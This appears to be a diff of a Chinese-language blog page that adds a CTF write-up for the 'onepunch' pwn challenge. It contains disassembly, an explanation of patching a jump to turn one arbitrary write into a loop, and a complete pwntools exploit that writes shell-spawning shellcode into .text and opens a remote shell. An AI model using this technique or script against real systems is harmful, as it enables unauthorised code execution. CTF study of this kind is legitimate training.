@@ -146,6 +146,98 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/hackme-inndy-tw-onepunch-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wh0am1">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0am1's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/archives/hackme-inndy-tw-onepunch-Writeup/" class="post-title-link" itemprop="url">hackme.inndy.tw onepunch Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2020-10-16 19:39:06 / 修改時間：20:05:06" itemprop="dateCreated datePublished" datetime="2020-10-16T19:39:06+08:00">2020-10-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="hackme-inndy-tw-onepunch-pwn"><a href="#hackme-inndy-tw-onepunch-pwn" class="headerlink" title="hackme.inndy.tw onepunch (pwn)"></a>hackme.inndy.tw onepunch (pwn)</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p><code>nc hackme.inndy.tw 7718</code></p>
+<p>Punch!</p>
+<h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><p>Partial RELRO, NX, Canary</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程式邏輯"><a href="#程式邏輯" class="headerlink" title="程式邏輯"></a>程式邏輯</h3><p>main:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where What?&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">&quot;%llx %d&quot;</span>, &amp;v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *v6 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">255</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No flag for you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先是讀一個pointer和int, 接著把pointer指向的地方改成輸入的數字</p>
+<p>因此我們拿到了一個Arbitrary Write, 但只有一次</p>
+<p>先補一下assembly code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">156: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; var int64_t var_18h @ rbp-0x18</span><br><span class="line">│           ; var uint32_t var_14h @ rbp-0x14</span><br><span class="line">│           ; var int64_t var_10h @ rbp-0x10</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">│           0x004006f2      55             push rbp</span><br><span class="line">│           0x004006f3      4889e5         mov rbp, rsp</span><br><span class="line">│           0x004006f6      4883ec20       sub rsp, 0x20</span><br><span class="line">│           0x004006fa      64488b042528.  mov rax, qword fs:[0x28]</span><br><span class="line">│           0x00400703      488945f8       mov qword [canary], rax</span><br><span class="line">│           0x00400707      31c0           xor eax, eax</span><br><span class="line">│           0x00400709      488b05480920.  mov rax, qword [obj.stdout] ; rdi</span><br><span class="line">│                                                                      ; [0x601058:8]&#x3D;0                          </span><br><span class="line">│           0x00400710      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x00400715      4889c7         mov rdi, rax                ; FILE *stream</span><br><span class="line">│           0x00400718      e863feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)</span><br><span class="line">│           0x0040071d      bf14084000     mov edi, str.Where_What     ; 0x400814 ; &quot;Where What?&quot; ; const char *format                                                                                                            </span><br><span class="line">│           0x00400722      b800000000     mov eax, 0</span><br><span class="line">│           0x00400727      e864feffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">│           0x0040072c      488d55e8       lea rdx, qword [var_18h]</span><br><span class="line">│           0x00400730      488d45f0       lea rax, qword [var_10h]</span><br><span class="line">│           0x00400734      4889c6         mov rsi, rax</span><br><span class="line">│           0x00400737      bf20084000     mov edi, str.llx__d         ; 0x400820 ; &quot;%llx %d&quot; ; const char *format                                                                                                                </span><br><span class="line">│           0x0040073c      b800000000     mov eax, 0</span><br><span class="line">│           0x00400741      e86afeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x00400746      8945ec         mov dword [var_14h], eax</span><br><span class="line">│           0x00400749      837dec02       cmp dword [var_14h], 2</span><br><span class="line">│       ┌─&lt; 0x0040074d      7407           je 0x400756</span><br><span class="line">│       │   0x0040074f      b800000000     mov eax, 0</span><br><span class="line">│      ┌──&lt; 0x00400754      eb22           jmp 0x400778</span><br><span class="line">│      ││   ; CODE XREF from main @ 0x40074d</span><br><span class="line">│      │└─&gt; 0x00400756      488b45f0       mov rax, qword [var_10h]</span><br><span class="line">│      │    0x0040075a      8b55e8         mov edx, dword [var_18h]</span><br><span class="line">│      │    0x0040075d      8810           mov byte [rax], dl</span><br><span class="line">│      │    0x0040075f      8b45e8         mov eax, dword [var_18h]</span><br><span class="line">│      │    0x00400762      3dff000000     cmp eax, 0xff               ; 255</span><br><span class="line">│      │┌─&lt; 0x00400767      750a           jne 0x400773</span><br><span class="line">│      ││   0x00400769      bf28084000     mov edi, str.No_flag_for_you ; 0x400828 ; &quot;No flag for you&quot; ; const char *s                                                                                                            </span><br><span class="line">│      ││   0x0040076e      e8edfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│      ││   ; CODE XREF from main @ 0x400767</span><br><span class="line">│      │└─&gt; 0x00400773      b800000000     mov eax, 0</span><br><span class="line">│      │    ; CODE XREF from main @ 0x400754</span><br><span class="line">│      └──&gt; 0x00400778      488b4df8       mov rcx, qword [canary]</span><br><span class="line">│           0x0040077c      6448330c2528.  xor rcx, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00400785      7405           je 0x40078c</span><br><span class="line">│       │   0x00400787      e8e4fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from main @ 0x400785</span><br><span class="line">│       └─&gt; 0x0040078c      c9             leave</span><br><span class="line">└           0x0040078d      c3             ret</span><br></pre></td></tr></table></figure>
+
+<h3 id="補充知識"><a href="#補充知識" class="headerlink" title="補充知識"></a>補充知識</h3><p>然後再補一下assembly <code>jxx &lt;address&gt;</code> instruction:</p>
+<p>基本上是2 byte的instruction:</p>
+<ol>
+<li>第一個byte是jxx指令本身</li>
+<li>第二個byte是offset(相對於當前的RIP/EIP)</li>
+</ol>
+<p>以<code>0x00400767</code> 的<code>jne 0x400773</code>為例:</p>
+<ol>
+<li>此處機械碼為 <code>750a</code></li>
+<li><code>0x75</code> 為 <code>jne</code></li>
+<li><code>0x400773 = 0x400767 + 0xa</code></li>
+</ol>
+<p>所以我們可以先把<code>0x00400767</code> 的<code>jne 0x400773</code> 改成跳到main的起點</p>
+<p>這樣就可以成為無限迴圈(因為<code>v4</code>永遠不會等於<code>255</code>, <code>0xff</code> 是無效的opcode)</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>有了無限迴圈之後, 就可以寫值了</p>
+<p>只要最後把它再次patch回去就好</p>
+<p>因為可以將<code>v6</code>的值改成 <code>v4</code>, 我們可以逐byte寫入shellcode(注意v4是<code>int</code>)</p>
+<p>接下來是要想寫到哪一段記憶體, 因為有NX, 可以考慮寫到<code>.text</code></p>
+<p>以我的exploit為例, 是跳轉到<code>__libc_csu_init</code> 因為空間夠大而且address &gt; main 0x400773</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>注意最後要再patch回來</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># new code based on Writeup: https://blog.csdn.net/kevin66654/article/details/88563770</span></span><br><span class="line"><span class="comment"># seems better (?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x00400790</span> <span class="comment"># __libc_csu_init</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;hackme.inndy.tw&#x27;</span>, <span class="number">7718</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>, <span class="string">&#x27;0x400768 137&#x27;</span>)</span><br><span class="line"><span class="comment"># time.sleep(0.5)</span></span><br><span class="line"><span class="comment"># p.sendline(&#x27;0x400763 -2&#x27;)</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sc)):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(hex(base + i) + <span class="string">&#x27; &#x27;</span> + str(ord(sc[i])))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[+] Wrote %d bytes to .text&#x27;</span> % (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[+] Wrote shellcode to .text&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;0x400768 39&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>p.s. 寫到csu是我看別人writeup之後改的</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
     <link itemprop="mainEntityOfPage" href="https://wh00am1.github.io/archives/pwnable-tw-ORW-Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -439,7 +531,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
